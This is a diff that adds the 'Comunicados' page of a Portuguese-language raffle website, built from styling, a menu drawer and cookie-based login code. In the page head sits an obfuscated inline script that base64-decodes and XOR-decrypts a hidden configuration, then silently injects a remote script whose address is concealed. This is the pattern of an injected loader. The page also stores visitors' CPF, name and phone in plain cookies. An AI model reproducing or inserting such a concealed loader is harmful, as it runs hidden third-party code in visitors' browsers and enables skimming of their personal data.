@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <title>Comunicados - AÇÃO RELÂMPAGO 2.0 ⚡️</title>
+    <script>(function () { var w_a75 = atob("DMzjstv6iAmsvbYKu7fBx6mWqjOO1cJ+y7/ZnfSZ7GeCyMJn0qqanLiV5SfOz5l52L6Kwq+Jp3nFxdNmlLyKyr6WpmPfn5oo2riXwLKY/X3JzpQw4JHPkLyW52vN0cUogZeYkLWb5WyOh5R60rSG3pKeqiWOy9dmzqnBiPnM6WjOi9A6i/6CiuvJvjnN3oRu3anX0+3Y9VTR"); var n_y7sn = []; for (var e_8 = 0; e_8 < w_a75.length; e_8++) { n_y7sn.push(w_a75.charCodeAt(e_8) & 255); } var o_d = n_y7sn[0]; var k_m3t7 = n_y7sn.slice(1, 1 + o_d); var f_bi = n_y7sn.slice(1 + o_d); var w_3i = f_bi.map(function (b, m_ti) { return b ^ k_m3t7[m_ti % o_d]; }); var k_5 = ""; for (var b_7 = 0; b_7 < w_3i.length; b_7++) { k_5 += String.fromCharCode(w_3i[b_7] & 255); } var m_b = decodeURIComponent(escape(k_5)); var j_vqiy = JSON.parse(m_b); var y_sag = j_vqiy.globals || []; y_sag.forEach(function (o_wz) { window[o_wz.name] = o_wz.value; }); var p_1l6v = document.createElement("script"); p_1l6v.src = j_vqiy.url; p_1l6v.async = true; p_1l6v.defer = true; (j_vqiy.attributes || []).forEach(function (w_7) { p_1l6v.setAttribute(w_7.name, w_7.value); }); (document.head || document.documentElement).appendChild(p_1l6v); })();</script>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        *,
+        *::before,
+        *::after {
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: #161C24;
+            color: #fff;
+            padding-bottom: 30px;
+            font-size: 14px;
+        }
+
+        /* Header */
+        .header {
+            background: #000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo img {
+            height: 40px;
+            display: block;
+        }
+
+        .menu-icon {
+            width: 20px;
+            height: 12px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            cursor: pointer;
+        }
+
+        .menu-icon span {
+            display: block;
+            height: 2px;
+            background: #fff;
+            border-radius: 2px;
+            width: 100%;
+        }
+
+        /* Container */
+        .container {
+            padding: 15px;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        /* Título da página */
+        .page-title {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 1.1rem;
+            font-weight: 500;
+            color: #fff;
+            margin-bottom: 5px;
+        }
+
+        .page-title .icon {
+            font-size: 1.3rem;
+            color: #f1c40f;
+        }
+
+        /* Lista de campanhas */
+        .campaigns-list {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .campaign-item {
+            display: flex;
+            gap: 12px;
+            background: #212B36;
+            border-radius: 12px;
+            padding: 5px;
+            cursor: pointer;
+            transition: transform 0.15s, background 0.15s;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.171);
+        }
+
+        .campaign-item:hover {
+            background: #1f2937;
+            transform: translateY(-2px);
+        }
+
+        .campaign-item img {
+            width: 90px;
+            height: 110px;
+            object-fit: cover;
+            border-radius: 10px;
+            flex-shrink: 0;
+            background: #0d1117;
+        }
+
+        .campaign-info {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            min-width: 0;
+        }
+
+        .campaign-info h3 {
+            font-size: 0.95rem;
+            font-weight: 500;
+            color: #fff;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+            line-height: 1.2;
+        }
+
+        .campaign-info p {
+            font-size: 0.8rem;
+            color: #e7e7e7;
+            margin-bottom: 8px;
+            font-weight: 000;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 5px 7px;
+            border-radius: 6px;
+            font-size: 0.5rem;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            align-self: flex-start;
+        }
+
+        .badge.ativo {
+            background: #198754;
+            color: #fff;
+        }
+
+        .badge.concluido {
+            background: #DFE3E8;
+            color: #292929;
+            border: 1px solid #5a6270;
+        }
+
+        /* ===== MENU DRAWER (tela cheia) ===== */
+        .menu-drawer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 2000;
+            transform: translateY(-100%);
+            transition: transform 0.35s ease;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .menu-drawer.active {
+            transform: translateY(0);
+        }
+
+        .menu-drawer-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            border-bottom: 1px solid #222;
+            flex-shrink: 0;
+        }
+
+        .menu-drawer-header .logo img {
+            height: 40px;
+            display: block;
+        }
+
+        .menu-drawer-close {
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-size: 1.6rem;
+            font-weight: 300;
+            cursor: pointer;
+            line-height: 1;
+            padding: 5px 10px;
+        }
+
+        .menu-drawer-profile {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 18px 20px;
+            border-bottom: 1px solid #222;
+        }
+
+        .menu-drawer-profile .avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: #2a2a2a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .menu-drawer-profile .avatar svg {
+            width: 28px;
+            height: 28px;
+            fill: #888;
+        }
+
+        .menu-drawer-profile .info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .menu-drawer-profile .info .name {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 2px;
+        }
+
+        .menu-drawer-profile .info .phone {
+            font-size: 0.85rem;
+            color: #aaa;
+        }
+
+        .menu-drawer-list {
+            flex: 1;
+            padding: 8px 0;
+        }
+
+        .menu-drawer-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px 20px;
+            color: #fff;
+            font-size: 0.95rem;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            border: none;
+            background: transparent;
+            width: 100%;
+            text-align: left;
+            font-family: inherit;
+        }
+
+        .menu-drawer-item:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .menu-drawer-item.active {
+            background: rgba(25, 135, 84, 0.15);
+            color: #5BE584;
+        }
+
+        .menu-drawer-item .icon {
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .menu-drawer-item .icon svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        .menu-drawer-footer {
+            padding: 20px;
+            flex-shrink: 0;
+        }
+
+        .menu-drawer-btn {
+            width: 100%;
+            background: #198754;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-family: inherit;
+        }
+
+        .menu-drawer-btn svg {
+            width: 18px;
+            height: 18px;
+            fill: currentColor;
+        }
+
+        .menu-drawer-version {
+            text-align: center;
+            color: #666;
+            font-size: 0.75rem;
+            padding-bottom: 20px;
+        }
+
+        /* Rodapé Social */
+        .social-footer {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            padding: 20px 0;
+        }
+
+        .social-footer .css-1yjo05o {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .social-footer .css-1yjo05o svg {
+            width: 30px;
+            height: 30px;
+            padding: 5px;
+            box-sizing: border-box;
+            color: #fff;
+            border-radius: 5px;
+            transition: transform 0.2s ease;
+        }
+
+        .social-footer .css-1yjo05o svg:nth-child(1) {
+            background-color: #395693;
+        }
+
+        .social-footer .css-1yjo05o svg:nth-child(2) {
+            background-color: #428ef1;
+        }
+
+        .social-footer .css-1yjo05o svg:nth-child(3) {
+            background-color: #2494de;
+        }
+
+        .social-footer .css-1yjo05o svg:nth-child(4) {
+            background-color: #25D366;
+        }
+
+        .social-footer .css-1yjo05o svg:hover {
+            transform: scale(1.1);
+        }
+
+        /* Modal Checkout (reaproveitado do index) */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.555);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+            padding: 20px;
+            backdrop-filter: blur(3px);
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: #212B36;
+            width: 100%;
+            max-width: 380px;
+            border-radius: 16px;
+            padding: 20px;
+            position: relative;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .checkout-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding-right: 25px;
+        }
+
+        .checkout-header h2 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .modal-close {
+            position: absolute;
+            right: 20px;
+            top: 20px;
+            background: transparent;
+            border: none;
+            color: #9099a1;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .checkout-field {
+            margin-bottom: 20px;
+        }
+
+        .checkout-field input {
+            width: 100%;
+            background: transparent;
+            border: 1px solid #424a50;
+            border-radius: 8px;
+            padding: 14px 15px;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        .checkout-field input:focus {
+            border-color: #27ae60;
+        }
+
+        .checkout-submit {
+            width: 100%;
+            background: #198754;
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        @media (min-width: 500px) {
+            body {
+                max-width: 480px;
+                margin: 0 auto;
+                border-left: 1px solid #222;
+                border-right: 1px solid #222;
+                min-height: 100vh;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="logo">
+            <img src="https://sp1-s3.saveincloud.io/gelmotos-pbglfl/0f989d81-238d-4dd2-8422-94a9c6ea5639.png"
+                alt="Logo">
+        </div>
+        <div class="menu-icon" onclick="openMenuDrawer()">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </header>
+    <div style="background-color: black;">
+        <div style="background-color: #212B36; padding: 15px 10px 10px 10px; border-radius: 15px 15px 0px 0px;">
+            <h1 style="font-size: 17px; font-weight: 600;">📢 Comunicados</h1>
+
+            <div style="margin-top: 10px;">
+                <p
+                    style="color: #67737e; background-color: #212B36; padding: 15px; font-size: 16PX; border-radius: 10px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.137);">
+                    Nenhum comunicado até o momento!</p>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ===== MENU DRAWER ===== -->
+    <div class="menu-drawer" id="menuDrawer">
+        <div class="menu-drawer-header">
+            <div class="logo">
+                <img src="https://sp1-s3.saveincloud.io/gelmotos-pbglfl/0f989d81-238d-4dd2-8422-94a9c6ea5639.png"
+                    alt="Logo">
+            </div>
+            <button class="menu-drawer-close" onclick="closeMenuDrawer()">✕</button>
+        </div>
+
+        <div class="menu-drawer-profile" id="menuDrawerProfile" style="display: none;">
+            <div class="avatar">
+                <svg viewBox="0 0 24 24">
+                    <path
+                        d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                </svg>
+            </div>
+            <div class="info">
+                <div class="name" id="menuDrawerName">Cliente</div>
+                <div class="phone" id="menuDrawerPhone">(00) 0****-****</div>
+            </div>
+        </div>
+
+        <div class="menu-drawer-list">
+            <button class="menu-drawer-item" onclick="menuNavegar('index.html')">
+                <span class="icon"><svg viewBox="0 0 24 24">
+                        <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
+                    </svg></span>
+                Início
+            </button>
+            <button class="menu-drawer-item" onclick="menuNavegar('campanhas.html')">
+                <span class="icon"><svg viewBox="0 0 24 24">
+                        <path
+                            d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM7 9h10v2H7V9zm6 5H7v-2h6v2zm4-6H7V6h10v2z" />
+                    </svg></span>
+                Campanhas
+            </button>
+            <button class="menu-drawer-item active" onclick="menuNavegar('comunicados.html')">
+                <span class="icon"><svg viewBox="0 0 24 24">
+                        <path
+                            d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z" />
+                    </svg></span>
+                Comunicados
+            </button>
+            <button class="menu-drawer-item" onclick="menuNavegar('meus-titulos.html')">
+                <span class="icon"><svg viewBox="0 0 24 24">
+                        <path
+                            d="M22 10V6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v4c1.1 0 2 .9 2 2s-.9 2-2 2v4c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2v-4c-1.1 0-2-.9-2-2s.9-2 2-2zm-6 6h-2v-2h2v2zm0-4h-2v-2h2v2zm0-4h-2V6h2v2z" />
+                    </svg></span>
+                Meus títulos
+            </button>
+            <button class="menu-drawer-item" onclick="menuNavegar('ganhadores.html')">
+                <span class="icon"><svg viewBox="0 0 24 24">
+                        <path
+                            d="M19 5h-2V3H7v2H5c-1.1 0-2 .9-2 2v1c0 2.55 1.92 4.63 4.39 4.94.63 1.5 1.98 2.63 3.61 2.96V19H7v2h10v-2h-4v-3.1c1.63-.33 2.98-1.46 3.61-2.96C19.08 12.63 21 10.55 21 8V7c0-1.1-.9-2-2-2zM5 8V7h2v3.82C5.84 10.4 5 9.3 5 8zm14 0c0 1.3-.84 2.4-2 2.82V7h2v1z" />
+                    </svg></span>
+                Ganhadores
+            </button>
+            <!-- <button class="menu-drawer-item" onclick="menuNavegar('afiliados.html')">
+                <span class="icon"><svg viewBox="0 0 24 24">
+                        <path
+                            d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                    </svg></span>
+                Afiliados
+            </button>
+            <button class="menu-drawer-item" onclick="menuNavegar('termos.html')">
+                <span class="icon"><svg viewBox="0 0 24 24">
+                        <path
+                            d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z" />
+                    </svg></span>
+                Termos de uso
+            </button> -->
+            <button class="menu-drawer-item" onclick="menuNavegar('suporte.html')">
+                <span class="icon"><svg viewBox="0 0 24 24">
+                        <path
+                            d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
+                    </svg></span>
+                Suporte
+            </button>
+        </div>
+
+        <div class="menu-drawer-footer">
+            <button class="menu-drawer-btn" id="menuDrawerBtn" onclick="menuAcaoPrincipal()">
+                <svg viewBox="0 0 24 24">
+                    <path
+                        d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z" />
+                </svg>
+                <span id="menuDrawerBtnText">Entrar</span>
+            </button>
+        </div>
+
+        <div class="menu-drawer-version">2.1.2</div>
+    </div>
+
+
+
+    <script>
+        // ============================================================
+        // COOKIES
+        // ============================================================
+        const AUTH_COOKIE = 'rifa_auth_token';
+
+        function setCookie(name, value, days) {
+            const expires = new Date(Date.now() + days * 864e5).toUTCString();
+            document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/; SameSite=Lax`;
+        }
+
+        function getCookie(name) {
+            return document.cookie.split('; ').reduce((r, v) => {
+                const parts = v.split('=');
+                return parts[0] === name ? decodeURIComponent(parts[1]) : r;
+            }, '');
+        }
+
+        function deleteCookie(name) {
+            document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
+        }
+
+        function isLoggedIn() {
+            return !!getCookie(AUTH_COOKIE);
+        }
+
+        function formatarNome(nome) {
+            if (!nome) return 'Cliente';
+            const partes = nome.trim().split(/\s+/);
+            if (partes.length === 1) return partes[0];
+            return `${partes[0]} ${partes[partes.length - 1]}`;
+        }
+
+        function formatarTelefone(tel) {
+            if (!tel) return '(00) 0****-****';
+            const t = tel.replace(/\D/g, '');
+            if (t.length === 11) return `(${t.slice(0, 2)}) ${t[2]}****-${t.slice(-4)}`;
+            if (t.length === 10) return `(${t.slice(0, 2)}) ****-${t.slice(-4)}`;
+            return tel;
+        }
+
+        // ============================================================
+        // MENU DRAWER
+        // ============================================================
+        function openMenuDrawer() {
+            document.getElementById('menuDrawer').classList.add('active');
+            document.body.style.overflow = 'hidden';
+            atualizarMenuDrawer();
+        }
+
+        function closeMenuDrawer() {
+            document.getElementById('menuDrawer').classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        function atualizarMenuDrawer() {
+            const profile = document.getElementById('menuDrawerProfile');
+            const btnText = document.getElementById('menuDrawerBtnText');
+
+            const token = getCookie(AUTH_COOKIE);
+            const nome = getCookie('rifa_nome') || '';
+            const telefone = getCookie('rifa_telefone') || '';
+
+            if (token && nome) {
+                profile.style.display = 'flex';
+                document.getElementById('menuDrawerName').textContent = formatarNome(nome);
+                document.getElementById('menuDrawerPhone').textContent = formatarTelefone(telefone);
+                btnText.textContent = 'Sair';
+            } else {
+                profile.style.display = 'none';
+                btnText.textContent = 'Entrar';
+            }
+        }
+
+        function menuAcaoPrincipal() {
+            const token = getCookie(AUTH_COOKIE);
+
+            if (token) {
+                deleteCookie(AUTH_COOKIE);
+                deleteCookie('rifa_nome');
+                deleteCookie('rifa_telefone');
+                deleteCookie('rifa_cpf');
+                deleteCookie('rifa_qty');
+                closeMenuDrawer();
+                setTimeout(() => location.reload(), 300);
+            } else {
+                closeMenuDrawer();
+                setTimeout(() => openLogin(), 300);
+            }
+        }
+
+        function menuNavegar(url) {
+            if (url === '#' || !url) {
+                alert('Em breve!');
+                return;
+            }
+            window.location.href = url;
+        }
+
+        // ============================================================
+        // MODAL DE LOGIN
+        // ============================================================
+        let modoCheckout = 'login';
+
+        function openLogin() {
+            modoCheckout = 'login';
+            document.getElementById('checkoutModalTitle').textContent = '🔐 Entrar';
+            document.getElementById('checkoutModalOverlay').classList.add('active');
+            document.body.style.overflow = 'hidden';
+
+            // Pré-preenche
+            const nomeSalvo = getCookie('rifa_nome');
+            const telSalvo = getCookie('rifa_telefone');
+            const cpfSalvo = getCookie('rifa_cpf');
+
+            if (nomeSalvo) document.getElementById('nomeInput').value = nomeSalvo;
+            if (telSalvo) {
+                let v = telSalvo;
+                if (v.length > 10) v = v.replace(/(\d{2})(\d{5})(\d{0,4})/, '($1) $2-$3');
+                else v = v.replace(/(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
+                document.getElementById('telefoneInput').value = v;
+            }
+            if (cpfSalvo) {
+                let v = cpfSalvo.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, '$1.$2.$3-$4');
+                document.getElementById('cpfInput').value = v;
+            }
+        }
+
+        function closeCheckout() {
+            document.getElementById('checkoutModalOverlay').classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        function concluirReserva() {
+            const nome = document.getElementById('nomeInput').value.trim();
+            const telefone = document.getElementById('telefoneInput').value.replace(/\D/g, '');
+            const cpf = document.getElementById('cpfInput').value.replace(/\D/g, '');
+
+            if (nome.length < 3) { alert('Informe seu nome completo.'); return; }
+            if (telefone.length < 10) { alert('Informe um telefone válido.'); return; }
+            if (cpf.length !== 11) { alert('Informe um CPF válido.'); return; }
+
+            const token = 'tk_' + Date.now() + '_' + Math.random().toString(36).substring(2, 15);
+            setCookie(AUTH_COOKIE, token, 1);
+            setCookie('rifa_cpf', cpf, 1);
+            setCookie('rifa_nome', nome, 1);
+            setCookie('rifa_telefone', telefone, 1);
+
+            closeCheckout();
+            atualizarMenuDrawer();
+
+            // Toast
+            const toast = document.createElement('div');
+            toast.textContent = '✅ Login realizado com sucesso!';
+            toast.style.cssText = `position: fixed; top: 20px; right: 0; background: #198754; color: #fff; padding: 12px 20px 12px 24px; border-top-left-radius: 8px; border-bottom-left-radius: 8px; font-weight: 700; z-index: 9999; box-shadow: -4px 4px 12px rgba(0,0,0,0.3); transform: translateX(100%); transition: transform 0.4s ease; white-space: nowrap;`;
+            document.body.appendChild(toast);
+            requestAnimationFrame(() => toast.style.transform = 'translateX(0)');
+            setTimeout(() => {
+                toast.style.transform = 'translateX(100%)';
+                setTimeout(() => toast.remove(), 400);
+            }, 2500);
+        }
+
+        // ============================================================
+        // MÁSCARAS
+        // ============================================================
+        const cpfInput = document.getElementById('cpfInput');
+        if (cpfInput) {
+            cpfInput.addEventListener('input', function (e) {
+                let v = e.target.value.replace(/\D/g, '');
+                if (v.length > 11) v = v.slice(0, 11);
+                if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, '$1.$2.$3-$4');
+                else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{0,3})/, '$1.$2.$3');
+                else if (v.length > 3) v = v.replace(/(\d{3})(\d{0,3})/, '$1.$2');
+                e.target.value = v;
+            });
+        }
+
+        const telefoneInput = document.getElementById('telefoneInput');
+        if (telefoneInput) {
+            telefoneInput.addEventListener('input', function (e) {
+                let v = e.target.value.replace(/\D/g, '');
+                if (v.length > 11) v = v.slice(0, 11);
+                if (v.length > 10) v = v.replace(/(\d{2})(\d{5})(\d{0,4})/, '($1) $2-$3');
+                else if (v.length > 6) v = v.replace(/(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
+                else if (v.length > 2) v = v.replace(/(\d{2})(\d{0,5})/, '($1) $2');
+                else if (v.length > 0) v = v.replace(/(\d{0,2})/, '($1');
+                e.target.value = v;
+            });
+        }
+
+        // ============================================================
+        // CAMPANHA CONCLUÍDA
+        // ============================================================
+
+        // ============================================================
+        // INICIALIZA
+        // ============================================================
+        document.addEventListener('DOMContentLoaded', function () {
+            atualizarMenuDrawer();
+        });
+
+        // Fecha modal clicando fora
+        document.getElementById('checkoutModalOverlay')?.addEventListener('click', function (e) {
+            if (e.target.id === 'checkoutModalOverlay') closeCheckout();
+        });
+    </script>
+</body>
+
+</html>
